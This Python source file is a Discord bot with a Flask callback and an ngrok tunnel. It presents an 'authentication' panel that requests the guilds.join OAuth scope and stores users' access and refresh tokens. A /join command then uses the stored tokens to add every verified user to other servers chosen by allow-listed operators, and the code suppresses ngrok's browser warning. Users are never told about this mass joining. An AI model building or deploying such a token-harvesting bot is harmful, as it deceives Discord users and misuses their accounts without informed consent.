import os
import json
import threading
import requests
import time
from flask import Flask, request, render_template_string
import discord
from discord.ext import commands
from discord import app_commands
from pyngrok import ngrok, conf
import asyncio

# ---------------------------- 設定 ------------------------------------------

TOKEN = "BOTトークン"
CLIENT_ID = ID-HERE
CLIENT_SECRET = "SECRET HERE"
NGROK_AUTHTOKEN = "NGROK-TOKEN-HERE"
DEVELOPER_ID = discord-dev-id
USER_FILE = "allowed_users.json"
DATA_FILE = "verified_users.json"

#-----------------------------------------------------------------------------

intents = discord.Intents.default()
intents.members = True
bot = commands.Bot(command_prefix="!", intents=intents)
tree = bot.tree

def load_users():
    if not os.path.exists(DATA_FILE):
        return {}
    with open(DATA_FILE, "r", encoding="utf-8") as f:
        return json.load(f)

def save_users(data):
    with open(DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)


def load_allowed_users():
    if os.path.exists(USER_FILE):
        with open(USER_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
            return set(data.get("users", []))
    return {DEVELOPER_ID}

def save_allowed_users():
    with open(USER_FILE, "w", encoding="utf-8") as f:
        json.dump({"users": list(allowed_users)}, f, ensure_ascii=False, indent=2)

def is_allowed(user_id: int) -> bool:
    return user_id in allowed_users

allowed_users = load_allowed_users()



app = Flask(__name__)

@app.route("/callback")
def callback():
    code = request.args.get("code")
    if not code:
        return render_template_string("""
        <html><head><title>認証エラー</title>
        <style>body{background:#2C2F33;color:#FFF;text-align:center;padding-top:100px}
        .card{background:#23272A;padding:40px;border-radius:15px;display:inline-block}
        h1{color:#FF5555}</style></head>
        <body><div class="card"><h1>❌ 認証コードがありません</h1></div></body></html>
        """), 400

    token_url = "https://discord.com/api/oauth2/token"
    data = {
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": REDIRECT_URI,
    }
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    res = requests.post(token_url, data=data, headers=headers)
    if res.status_code != 200:
        return render_template_string("""
        <html><head><title>認証エラー</title>
        <style>body{background:#2C2F33;color:#FFF;text-align:center;padding-top:100px}
        .card{background:#23272A;padding:40px;border-radius:15px;display:inline-block}
        h1{color:#FF5555}</style></head>
        <body><div class="card"><h1>❌ 認証に失敗しました</h1></div></body></html>
        """), 400

    token_data = res.json()
    access_token = token_data["access_token"]
    refresh_token = token_data.get("refresh_token")
    expires_in = token_data.get("expires_in", 3600)

    user_res = requests.get(
        "https://discord.com/api/users/@me",
        headers={"Authorization": f"Bearer {access_token}"}
    )
    user = user_res.json()
    user_id_str = str(user["id"])

    users = load_users()
    if user_id_str not in users:
        users[user_id_str] = {}

    guild_id = users[user_id_str].get("guild_id")
    role_id = users[user_id_str].get("role_id")

    users[user_id_str].update({
        "access_token": access_token,
        "refresh_token": refresh_token,
        "expires_at": int(time.time()) + expires_in,
        "role_pending": True
    })
    save_users(users)

    return render_template_string(f"""
    <html>
    <head><title>認証完了</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body{{margin:0;height:100vh;display:flex;justify-content:center;align-items:center;background-color:#2C2F33;color:#FFF;font-family:'Segoe UI',sans-serif}}
        .card{{background-color:#2C2F33;padding:5vw 7vw;border-radius:12px;text-align:center;width:90%;max-width:400px;box-shadow:0 8px 20px rgba(0,0,0,0.3)}}
        h1{{font-size:6vw;margin-bottom:2vw;color:#43B581}}
        p{{font-size:4vw;margin-bottom:4vw}}
        @media (min-width:768px){{h1{{font-size:2rem}}p{{font-size:1.2rem}}}}
    </style></head>
    <body>
        <div class="card"><h1>✅ 認証完了！</h1><p>{user['username']} さん、認証が完了しました。</p></div>
    </body></html>
    """)

@app.after_request
def skip_ngrok_warning(response):
    response.headers["ngrok-skip-browser-warning"] = "true"
    return response


def get_oauth_url():
    return (
        f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}"
        f"&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify%20guilds.join"
    )

@tree.command(name="verify", description="認証パネルを表示します")
@app_commands.describe(role="認証後に付与したいロールを選択")
async def verify(interaction: discord.Interaction, role: discord.Role):
    if not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message("エラー: このコマンドは管理者権限が必要です。", ephemeral=True)
        return

    bot_member = interaction.guild.get_member(interaction.client.user.id)
    if role >= bot_member.top_role:
        await interaction.response.send_message(f"⚠ このロールはBOTより上のため付与不可: {role.name}", ephemeral=True)
        return

    embed = discord.Embed(title="認証が必要です",
                          description="下のボタンから認証サイトにアクセスしてください。",
                          color=discord.Color.blue())
    view = discord.ui.View()
    view.add_item(discord.ui.Button(label="認証する", url=get_oauth_url(), style=discord.ButtonStyle.link))

    users = load_users()
    users[str(interaction.user.id)] = {
        "guild_id": interaction.guild.id,
        "role_id": role.id
    }
    save_users(users)

    await interaction.response.send_message(embed=embed, view=view)


@tree.command(name="join", description="認証済みユーザーを指定サーバーに追加します")
@app_commands.describe(guild="ユーザーを追加するサーバーID")
async def join(interaction: discord.Interaction, guild: str):
    if not is_allowed(interaction.user.id):
        await interaction.response.send_message("あなたはこのコマンドを使えません", ephemeral=True)
        return

    guild_id = int(guild)
    guild_obj = bot.get_guild(guild_id)
    if not guild_obj:
        return await interaction.response.send_message("Bot がそのサーバーにいません", ephemeral=True)

    users = load_users()
    added_count = 0
    failed_count = 0

    for user_id, info in users.items():
        access_token = refresh_access_token(user_id)
        if not access_token:
            failed_count += 1
            continue

        url = f"https://discord.com/api/guilds/{guild_id}/members/{user_id}"
        headers = {"Authorization": f"Bot {TOKEN}"}
        json_data = {"access_token": access_token}
        res = requests.put(url, headers=headers, json=json_data)
        if res.status_code in (200, 201, 204):
            added_count += 1
        else:
            failed_count += 1

    embed = discord.Embed(title="✅ /join 実行結果", color=discord.Color.green())
    embed.add_field(name="追加できたユーザー数", value=str(added_count), inline=False)
    embed.add_field(name="追加できなかったユーザー数", value=str(failed_count), inline=False)
    await interaction.response.send_message(embed=embed, ephemeral=True)


@tree.command(name="list", description="登録済みユーザーの人数を表示します")
async def list_user(interaction: discord.Interaction):
    users = load_users()
    await interaction.response.send_message(f"登録済みユーザー数: {len(users)}人")


def refresh_access_token(user_id_str):
    users = load_users()
    info = users.get(user_id_str)
    if not info:
        return None
    now = int(time.time())
    if now < info.get("expires_at", 0):
        return info.get("access_token")
    refresh_token = info.get("refresh_token")
    if not refresh_token:
        return None

    token_url = "https://discord.com/api/oauth2/token"
    data = {
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "grant_type": "refresh_token",
        "refresh_token": refresh_token,
        "redirect_uri": REDIRECT_URI,
    }
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    res = requests.post(token_url, data=data, headers=headers)
    if res.status_code != 200:
        return None

    token_data = res.json()
    access_token = token_data["access_token"]
    refresh_token = token_data.get("refresh_token", refresh_token)
    expires_in = token_data.get("expires_in", 3600)
    info.update({
        "access_token": access_token,
        "refresh_token": refresh_token,
        "expires_at": int(time.time()) + expires_in
    })
    save_users(users)
    return access_token


@tree.command(name="add-user", description="コマンド実行可能ユーザーを追加")
async def add_user(interaction: discord.Interaction, user: discord.User):
    if interaction.user.id != DEVELOPER_ID:
        await interaction.response.send_message("開発者のみ使用可能", ephemeral=True)
        return
    allowed_users.add(user.id)
    save_allowed_users()
    await interaction.response.send_message(f"{user.mention} を許可リストに追加しました")

@tree.command(name="remove-user", description="コマンド実行可能ユーザーを削除")
async def remove_user(interaction: discord.Interaction, user: discord.User):
    if interaction.user.id != DEVELOPER_ID:
        await interaction.response.send_message("開発者のみ使用可能", ephemeral=True)
        return
    if user.id in allowed_users and user.id != DEVELOPER_ID:
        allowed_users.remove(user.id)
        save_allowed_users()
        await interaction.response.send_message(f"{user.mention} を許可リストから削除しました")
    else:
        await interaction.response.send_message("削除できません（存在しないか開発者IDです）")



async def rolefuyo():
    await bot.wait_until_ready()
    while True:
        users = load_users()
        for user_id_str, info in users.items():
            if info.get("role_pending"):
                guild = bot.get_guild(info["guild_id"])
                if guild:
                    member = guild.get_member(int(user_id_str))
                    if member:
                        role = guild.get_role(info["role_id"])
                        if role:
                            try:
                                bot_member = guild.get_member(bot.user.id)
                                if role >= bot_member.top_role:
                                    print(f"BOT権限不足: {role.name}")
                                    continue
                                await member.add_roles(role)
                                info["role_pending"] = False
                                save_users(users)
                                print(f"{member} にロール {role.name} を付与")
                            except discord.Forbidden:
                                print(f"権限不足: {member} にロール {role.name} を付与できません")
                            except Exception as e:
                                print(f"ロール付与失敗: {e}")
        await asyncio.sleep(5)




def start_ngrok():
    conf.get_default().auth_token = NGROK_AUTHTOKEN
    tunnel = ngrok.connect(5000)
    global REDIRECT_URI
    REDIRECT_URI = f"{tunnel.public_url}/callback"
    print(" * ngrok tunnel opened:", tunnel.public_url)
    print(" * REDIRECT_URI:", REDIRECT_URI)
    print("===============================")
    print("Discord Developer Portal の『OAuth2 Redirects』に追加してください:", REDIRECT_URI)
    print("===============================")

def run_flask():
    app.run(host="0.0.0.0", port=5000)



@bot.event
async def on_ready():
    await tree.sync()
    print(f"{bot.user}")
    bot.loop.create_task(rolefuyo())

if __name__ == "__main__":
    start_ngrok()
    threading.Thread(target=run_flask).start()
    bot.run(TOKEN)
